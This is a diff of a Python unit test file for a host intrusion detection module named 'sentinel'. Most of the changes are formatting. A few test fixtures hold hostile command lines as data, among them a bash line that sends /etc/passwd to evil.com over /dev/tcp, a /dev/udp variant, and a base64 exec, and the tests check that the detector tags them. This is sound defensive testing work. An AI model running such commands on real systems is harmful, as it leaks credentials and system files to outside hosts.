@@ -15,7 +15,7 @@ from __future__ import annotations
 import json
 import time
 import unittest
-from unittest.mock import MagicMock, patch
+from unittest.mock import patch
 
 from phi_complexity.sentinel import (
     BayesianCorrelator,
@@ -37,13 +37,14 @@ from phi_complexity.sentinel.host import (
     _lire_proc_cmdline,
 )
 
-
 # ──────────────────────────────────────────────
 # HELPERS DE FABRICATION
 # ──────────────────────────────────────────────
 
-def _creer_event_processus(nom="python", pid=1234, cmdline="python script.py",
-                             timestamp=None) -> HostEvent:
+
+def _creer_event_processus(
+    nom="python", pid=1234, cmdline="python script.py", timestamp=None
+) -> HostEvent:
     return HostEvent(
         type=EventType.PROCESSUS,
         timestamp=timestamp or time.time(),
@@ -53,8 +54,9 @@ def _creer_event_processus(nom="python", pid=1234, cmdline="python script.py",
     )
 
 
-def _creer_event_reseau(port_local=8080, port_remote=443, etat="ESTABLISHED",
-                         proto="tcp", timestamp=None) -> HostEvent:
+def _creer_event_reseau(
+    port_local=8080, port_remote=443, etat="ESTABLISHED", proto="tcp", timestamp=None
+) -> HostEvent:
     return HostEvent(
         type=EventType.RESEAU,
         timestamp=timestamp or time.time(),
@@ -69,8 +71,9 @@ def _creer_event_reseau(port_local=8080, port_remote=443, etat="ESTABLISHED",
     )
 
 
-def _creer_trace(event: HostEvent, criticite=CriticiteTelemetrie.INFO,
-                  tags=None) -> TraceNormalisee:
+def _creer_trace(
+    event: HostEvent, criticite=CriticiteTelemetrie.INFO, tags=None
+) -> TraceNormalisee:
     return TraceNormalisee(
         evenement=event,
         criticite=criticite,
@@ -78,8 +81,9 @@ def _creer_trace(event: HostEvent, criticite=CriticiteTelemetrie.INFO,
     )
 
 
-def _creer_signal(type_b=TypeBehavior.C2, confiance=0.75,
-                   mitre="T1071") -> SignalComportemental:
+def _creer_signal(
+    type_b=TypeBehavior.C2, confiance=0.75, mitre="T1071"
+) -> SignalComportemental:
     return SignalComportemental(
         type=type_b,
         confiance=confiance,
@@ -103,6 +107,7 @@ def _creer_score(score=0.30, niveau="MODÉRÉ") -> ScoreSentinel:
 # ──────────────────────────────────────────────
 # COUCHE 1 — HOST
 # ──────────────────────────────────────────────
+
 
 class TestHostEvent(unittest.TestCase):
     def test_creation(self):
@@ -173,6 +178,7 @@ class TestHostCollector(unittest.TestCase):
     @patch("os.listdir", side_effect=OSError("permission denied"))
     def test_lire_proc_processus_erreur_acces(self, _mock):
         from phi_complexity.sentinel.host import _collecter_processus_linux
+
         events = _collecter_processus_linux()
         self.assertEqual(events, [])
 
@@ -187,18 +193,21 @@ class TestHostCollector(unittest.TestCase):
     @patch("subprocess.run", side_effect=OSError)
     def test_subprocess_processus_erreur(self, _):
         from phi_complexity.sentinel.host import _collecter_processus_subprocess
+
         events = _collecter_processus_subprocess()
         self.assertEqual(events, [])
 
     @patch("subprocess.run", side_effect=OSError)
     def test_subprocess_reseau_erreur(self, _):
         from phi_complexity.sentinel.host import _collecter_reseau_subprocess
+
         events = _collecter_reseau_subprocess()
         self.assertEqual(events, [])
 
     def test_reseau_linux_fichier_absent(self):
         """Si /proc/net/tcp n'existe pas, retourne liste vide."""
         from phi_complexity.sentinel.host import _collecter_reseau_linux
+
         with patch("builtins.open", side_effect=OSError):
             events = _collecter_reseau_linux()
         self.assertEqual(events, [])
@@ -207,6 +216,7 @@ class TestHostCollector(unittest.TestCase):
 # ──────────────────────────────────────────────
 # COUCHE 2 — TELEMETRY
 # ──────────────────────────────────────────────
+
 
 class TestTelemetryNormalizer(unittest.TestCase):
 
@@ -228,7 +238,8 @@ class TestTelemetryNormalizer(unittest.TestCase):
 
     def test_normaliser_processus_avec_base64(self):
         event = _creer_event_processus(
-            "python", cmdline="python -c 'exec(base64.b64decode(...))'")
+            "python", cmdline="python -c 'exec(base64.b64decode(...))'"
+        )
         traces = self.norm.normaliser([event])
         self.assertIn("encodage_base64", traces[0].tags)
 
@@ -258,12 +269,16 @@ class TestTelemetryNormalizer(unittest.TestCase):
         self.assertIn("destruction_systeme", traces[0].tags)
 
     def test_normaliser_processus_dev_tcp(self):
-        event = _creer_event_processus(cmdline="bash -c 'cat /etc/passwd > /dev/tcp/evil.com/443'")
+        event = _creer_event_processus(
+            cmdline="bash -c 'cat /etc/passwd > /dev/tcp/evil.com/443'"
+        )
         traces = self.norm.normaliser([event])
         self.assertIn("tcp_via_bash", traces[0].tags)
 
     def test_normaliser_processus_dev_udp(self):
-        event = _creer_event_processus(cmdline="bash -c 'echo test > /dev/udp/evil.com/53'")
+        event = _creer_event_processus(
+            cmdline="bash -c 'echo test > /dev/udp/evil.com/53'"
+        )
         traces = self.norm.normaliser([event])
         self.assertIn("udp_via_bash", traces[0].tags)
 
@@ -310,7 +325,9 @@ class TestTelemetryNormalizer(unittest.TestCase):
 
     def test_filtrer_par_criticite(self):
         trace_info = _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO)
-        trace_suspect = _creer_trace(_creer_event_processus(), CriticiteTelemetrie.SUSPECT)
+        trace_suspect = _creer_trace(
+            _creer_event_processus(), CriticiteTelemetrie.SUSPECT
+        )
         filtrees = self.norm.filtrer_par_criticite(
             [trace_info, trace_suspect], CriticiteTelemetrie.SUSPECT
         )
@@ -367,12 +384,15 @@ class TestTelemetryNormalizer(unittest.TestCase):
 # COUCHE 3 — BEHAVIOR
 # ──────────────────────────────────────────────
 
+
 class TestBehaviorAnalyzer(unittest.TestCase):
 
     def setUp(self):
         self.analyzer = BehaviorAnalyzer()
 
-    def _trace_avec_tag(self, tag: str, criticite=CriticiteTelemetrie.SUSPECT) -> TraceNormalisee:
+    def _trace_avec_tag(
+        self, tag: str, criticite=CriticiteTelemetrie.SUSPECT
+    ) -> TraceNormalisee:
         event = _creer_event_processus()
         trace = _creer_trace(event, criticite, tags=[tag])
         return trace
@@ -413,8 +433,8 @@ class TestBehaviorAnalyzer(unittest.TestCase):
 
     def test_signaux_tries_par_confiance(self):
         traces = [
-            self._trace_avec_tag("connexion_tor"),     # 0.75
-            self._trace_avec_tag("encodage_base64"),   # 0.65
+            self._trace_avec_tag("connexion_tor"),  # 0.75
+            self._trace_avec_tag("encodage_base64"),  # 0.65
         ]
         signaux = self.analyzer.analyser(traces)
         if len(signaux) >= 2:
@@ -483,6 +503,7 @@ class TestBehaviorAnalyzer(unittest.TestCase):
 # ──────────────────────────────────────────────
 # COUCHE 4 — BAYESIAN
 # ──────────────────────────────────────────────
+
 
 class TestBayesianCorrelator(unittest.TestCase):
 
@@ -587,6 +608,7 @@ class TestBayesianCorrelator(unittest.TestCase):
 # COUCHE 5 — RESPONSE
 # ──────────────────────────────────────────────
 
+
 class TestSentinelResponse(unittest.TestCase):
 
     def setUp(self):
@@ -637,6 +659,7 @@ class TestSentinelResponse(unittest.TestCase):
     def test_exporter_ioc_json_fichier(self):
         import tempfile
         import os
+
         score = _creer_score(score=0.50)
         alertes = self.responder.generer_alertes(score)
         with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
@@ -688,6 +711,7 @@ class TestSentinelResponse(unittest.TestCase):
 
     def test_politique_personnalisee(self):
         from phi_complexity.sentinel.response import NiveauAlerte, Alerte
+
         alerte = Alerte(
             niveau=NiveauAlerte.CRITIQUE,
             titre="Test",
@@ -707,13 +731,16 @@ class TestSentinelResponse(unittest.TestCase):
 
     def test_niveau_alerte_depuis_niveau(self):
         self.assertEqual(NiveauAlerte.depuis_niveau("FAIBLE"), NiveauAlerte.INFO)
-        self.assertEqual(NiveauAlerte.depuis_niveau("MODÉRÉ"), NiveauAlerte.AVERTISSEMENT)
+        self.assertEqual(
+            NiveauAlerte.depuis_niveau("MODÉRÉ"), NiveauAlerte.AVERTISSEMENT
+        )
         self.assertEqual(NiveauAlerte.depuis_niveau("ÉLEVÉ"), NiveauAlerte.ALERTE)
         self.assertEqual(NiveauAlerte.depuis_niveau("CRITIQUE"), NiveauAlerte.CRITIQUE)
         self.assertEqual(NiveauAlerte.depuis_niveau("INCONNU"), NiveauAlerte.INFO)
 
     def test_alerte_to_dict(self):
         from phi_complexity.sentinel.response import Alerte
+
         alerte = Alerte(
             niveau=NiveauAlerte.ALERTE,
             titre="Test",
@@ -737,6 +764,7 @@ class TestSentinelResponse(unittest.TestCase):
         """Le répertoire de sortie est créé automatiquement."""
         import tempfile
         import os
+
         score = _creer_score(score=0.50)
         alertes = self.responder.generer_alertes(score)
         with tempfile.TemporaryDirectory() as tmpdir:
@@ -750,15 +778,24 @@ class TestSentinelResponse(unittest.TestCase):
 # TEST MODULE __init__
 # ──────────────────────────────────────────────
 
+
 class TestSentinelInit(unittest.TestCase):
     def test_exports_publics(self):
         from phi_complexity import sentinel
+
         for nom in [
-            "HostCollector", "HostEvent", "EventType",
-            "TelemetryNormalizer", "TraceNormalisee",
-            "BehaviorAnalyzer", "SignalComportemental", "TypeBehavior",
-            "BayesianCorrelator", "ScoreSentinel",
-            "SentinelResponse", "NiveauAlerte",
+            "HostCollector",
+            "HostEvent",
+            "EventType",
+            "TelemetryNormalizer",
+            "TraceNormalisee",
+            "BehaviorAnalyzer",
+            "SignalComportemental",
+            "TypeBehavior",
+            "BayesianCorrelator",
+            "ScoreSentinel",
+            "SentinelResponse",
+            "NiveauAlerte",
         ]:
             self.assertTrue(hasattr(sentinel, nom), f"Manquant: {nom}")
 
